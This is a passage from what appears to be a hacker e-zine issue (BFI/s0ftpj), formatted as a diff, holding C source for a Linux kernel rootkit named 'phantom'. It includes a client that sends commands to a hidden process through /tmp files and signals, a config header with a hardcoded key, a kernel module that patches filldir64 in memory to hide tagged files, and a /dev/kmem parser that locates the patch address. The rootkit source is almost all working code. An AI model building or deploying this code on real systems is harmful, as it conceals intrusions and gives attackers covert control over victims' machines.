+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ */
+
+#include <sys/types.h>
+#include <signal.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#include "p_config.h"
+
+int pid=P_PID;
+int main(int argc,char *argv[]){
+	int fd;
+	char buffer[500];
+	
+	pid=P_PID;
+	if(argc==1)
+		fprintf(stderr,"Using hardcoded PID\n");
+	else
+		pid=atoi(argv[1]);
+	
+	while(1) {
+		if((fd=open(INPUT,O_CREAT|O_WRONLY| O_TRUNC))<0)
+			ERROR("Cannot open commands file!\n");
+		
+		memset(buffer,'\0',500);
+		fprintf(stderr,"Insert command:>");
+		read(0,buffer,500);
+		if(write(fd,buffer,strlen(buffer))<=0) {
+			fprintf(stderr,"Cannot write this command!\n");
+			continue;
+		}
+		close(fd);
+	        kill(pid,SIGSTKFLT);
+		sleep(1);
+		if((fd=open(CONTACT,O_RDONLY))<0)
+			continue;
+		memset(buffer,'\0',500);
+		while(read(fd,buffer,500)>0) 
+			fprintf(stderr,"%s",buffer);
+		fprintf(stderr,"\n");
+		close(fd);
+		remove(CONTACT);
+				  
+	}
+	return 0;
+}
+<-X->
+
+<-| phantom/p_config.h |->
+#define MAXMEMORYUSAGE 50000000 /* Change this to modify memory limits */
+#define TRUEMEMORYUSAGE MAXMEMORYUSAGE+10000000
+#define MAXNAMELENGTH  104+256
+#define SINGLEFILE     0
+#define DIRECTORY      1
+#define VALID          "A Phantom Valid Entry" /* Change this as you want */
+#define CONTACT        "/tmp/P_out" /* Outputs read by client */
+#define INPUT          "/tmp/P_in" /* Where client writes inputs */
+#define TEMPATH        "/tmp/P_temp" /* Service file */
+#define KEYLEN         8
+#define KEY            "h4x0r"
+#define ERROR(arg) { fprintf(stderr,"arg"); return -1; }
+#define P_PID	777
+#define HIDETAG		"change_this"
+<-X->
+
+<-| phantom/Obfuscate.c |->
+/*
+ * A simple files hider through filldr64
+ *
+ * Copyright (c) 2003 Pierre Falda <DarkAngel@antifork.org>
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ * 
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ */
+			
+
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+#include <linux/sched.h>
+#include <linux/mm.h>
+#include <linux/stat.h>
+#include <linux/file.h>
+#include <asm/uaccess.h>
+#include <asm/smplock.h>
+#include <linux/interrupt.h>
+#include <linux/spinlock.h>
+#include <linux/sched.h>
+#include <asm/current.h>
+#include "p_config.h"
+
+#define CODESIZE 7
+
+static char injcode[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char backup[CODESIZE];
+
+
+struct linux_dirent64 {
+        u64             d_ino;
+        s64             d_off;
+        unsigned short  d_reclen;
+        unsigned char   d_type;
+        char            d_name[0];
+};
+
+
+struct getdents_callback64 {
+        struct linux_dirent64 * current_dir;
+        struct linux_dirent64 * previous;
+        int count;
+        int error;
+};
+
+#define NAME_OFFSET(de) ((int) ((de)->d_name - (char *) (de)))
+#define ROUND_UP64(x) (((x)+sizeof(u64)-1) & ~(sizeof(u64)-1))
+
+static int n_filldir64(void * __buf, const char * name, int namlen, loff_t offset,
+                     ino_t ino, unsigned int d_type)
+{
+        struct linux_dirent64 * dirent, d;
+        struct getdents_callback64 * buf = (struct getdents_callback64 *) __buf;
+        int reclen = ROUND_UP64(NAME_OFFSET(dirent) + namlen + 1);
+	int ret;
+	static int (*o_filldir)(void *,const char *, int, loff_t, ino_t,unsigned int)=(void *)FILLDIR64;
+	if((strstr(name,HIDETAG)))
+		return 0;
+	memcpy((unsigned long *)FILLDIR64,backup,CODESIZE);
+	ret=o_filldir(__buf,name,namlen,offset,ino,d_type);
+	memcpy((unsigned long *)FILLDIR64,injcode,CODESIZE);
+	return ret;
+}
+
+
+int init_module (void) {
+        *(unsigned long *)&injcode[1]=(unsigned long)n_filldir64;
+        memcpy(backup,(unsigned long *)FILLDIR64,CODESIZE);
+        memcpy((unsigned long *)FILLDIR64,injcode,CODESIZE);
+        return 0;
+
+}
+
+void cleanup_module(void) {
+        memcpy((unsigned long *)FILLDIR64,backup,CODESIZE);
+}
+<-X->
+
+<-| phantom/Parser.c |->
+/*
+ * Do ./parser >> p_config.h to add filldir64 address
+ * 
+ * 
+ * Copyright (c) 2003 Pierre Falda <DarkAngel@antifork.org>
+ * 
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ * 
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ *    
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <bastard.h>
+#include <libdis.h>
+#include <sys/syscall.h>
+#define SIZE 20
+int             stalk_filldir64(int fd, unsigned long *address);
+
+int
+main(void)
+{
+    int             file_descriptor;
+    off_t           offset;
+    unsigned char   byte_letto;
+    if ((file_descriptor = open(KMEM, O_RDONLY)) < 0) {
+	fprintf(stderr, "Cannot open kmem\n");
+	exit(-1);
+    }
+    disassemble_init(0, ATT_SYNTAX);
+
+    if ((stalk_filldir64(file_descriptor, (unsigned long *) &offset)) < 0)
+	exit(-1);
+
+    disassemble_cleanup();
+    close(file_descriptor);
+}
+
+int
+stalk_filldir64(int fd, unsigned long *address)
+{
+    unsigned long   s_c_t[256] = {
+	0
+    };
+    static char     buffer[SIZE];
+    int             i,
+                    j,
+                    k;
+    struct instr    istruzione;
+    *address = SYS_CALL_TABLE;
+
+    if ((lseek(fd, *address, SEEK_SET)) == -1)
+	return -1;
+    if (read(fd, s_c_t, 256 * 4) <= 0)
+	return -1;
+    *address = s_c_t[__NR_getdents64];
+    for (i = 0, j = 0, k = 0;; i += j) {
+	if (lseek(fd, (*address) + i, SEEK_SET) == -1)
+	    return -1;
+	if (read(fd, buffer, SIZE) < SIZE) {
+	    fprintf(stderr, "Cannot read\n");
+	    return -1;
+	}
+	if ((j = disassemble_address(buffer, &istruzione))) {
+	    if (istruzione.mnemonic[0] != 0)
+		if ((strstr(istruzione.mnemonic, "call"))) {
+		    k = 1;
+
+		}
+	    if (k) {
+		if ((strstr(istruzione.mnemonic, "push"))) {
+		    if (istruzione.dest[0] != 0)
+			if ((strstr(istruzione.dest, "$0xC0"))) {
+			    printf("#define FILLDIR64 0x%s\n",
+				   &istruzione.dest[3]);
+			    break;
+			}
+		    if (istruzione.src[0] != 0)
+			if ((strstr(istruzione.src, "$0xC0"))) {
+			    printf("#define FILLDIR64 0x%s\n",
+				   &istruzione.src[3]);
+			    break;
+			}
+		}
+	    }
+	} else
+	    j = 1;
+    }
+
+
+
+    return 0;
+}
+<-X->
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://www.bfi.cx
+        http://bfi.freaknet.org
+        http://www.s0ftpj.org/bfi/
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
